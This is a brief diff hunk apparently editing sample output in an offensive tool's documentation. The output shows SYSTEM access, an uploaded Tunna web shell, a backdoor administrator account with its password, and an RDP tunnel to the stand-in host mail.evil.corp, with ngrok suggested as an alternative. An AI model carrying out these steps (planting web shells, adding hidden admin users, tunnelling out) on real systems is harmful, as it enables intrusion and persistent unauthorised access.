@@ -60,6 +60,7 @@ nt authority\system
 (*) Upload Tunna shell success!
 (*) Found ip address: 192.168.3.50
 (+) Add net user/password (Administrators): mrrobot/3LlioT! (Done!)
-(+) Listen tunnel at 127.0.0.1:1337 to mail.evil.corp:3389
+(+) Listen tunnel at 127.0.0.1:1337 connect to mail.evil.corp:3389
 (+) Abort
+Or use ngrok...
 ```
